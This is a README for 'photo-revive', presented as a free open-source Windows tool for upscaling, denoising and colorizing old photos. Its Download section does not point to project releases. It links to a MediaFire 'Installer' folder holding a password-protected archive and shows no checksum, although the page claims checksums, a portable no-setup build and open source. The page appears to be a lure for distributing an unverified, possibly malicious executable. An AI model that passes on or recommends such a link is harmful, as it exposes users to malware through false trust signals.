# photo-revive

🖌️ Free, open-source photo restoration for Windows — upscale, denoise and colorize old scans locally. 100 MB portable, offline, MIT, no account.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Scan repair pipeline** — denoise, sharpen and upscale in one pass tuned for old photo scans
- ✅ **Colorize mode** — grayscale photos get sensible color from a local model with a strength slider
- ✅ **4x upscaling** — Real-ESRGAN-class models take a 600 px scan to print-worthy size
- ✅ **Face restore pass** — optional GFPGAN-style enhancement for portraits that lost detail
- ✅ **Before and after view** — wipe divider compares original and result at matching zoom
- ✅ **Batch family albums** — run a folder of scans overnight with consistent settings
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why photo-revive

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **photo-revive** | Photoshop Neural Filters | MyHeritage | Web restore services |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid subscription | Paid | Credits |
| Open source | **Yes** | No | No | No
| Photos stay local | **Yes** | Yes | Upload | Upload
| Batch album runs | **Yes** | Manual | No | No
| Colorize plus upscale in one pass | **Yes** | Separate filters | Yes | Partial
| Portable, no install | **Yes, 100 MB** | Installer | Browser | Browser

## FAQ

**how to restore old family photos without paying per image?**

Restoration services charge per photo and want the family archive uploaded, and desktop suites cost a subscription. photo-revive denoises, upscales and colorizes locally with a face restore pass for portraits. It is a 100 MB portable exe, MIT, unlimited, offline — one evening restores the whole album.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark studio (#121418, sepia #D97706): wipe divider over a restored portrait at 4x, pipeline toggles for denoise, upscale and colorize all on, face restore badge lit.
2. Batch album view: 120 scans queued with previews, consistent settings locked, progress bar, ETA chip reading 22 minutes.
3. Compare mode: original grayscale left, colorized right, strength slider at 0.7, detail zoom inset showing recovered facial texture.

## Download

| Source | Link |
|---|---|
| 💾 **Installer photo-revive** | [Installer photo-revive](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).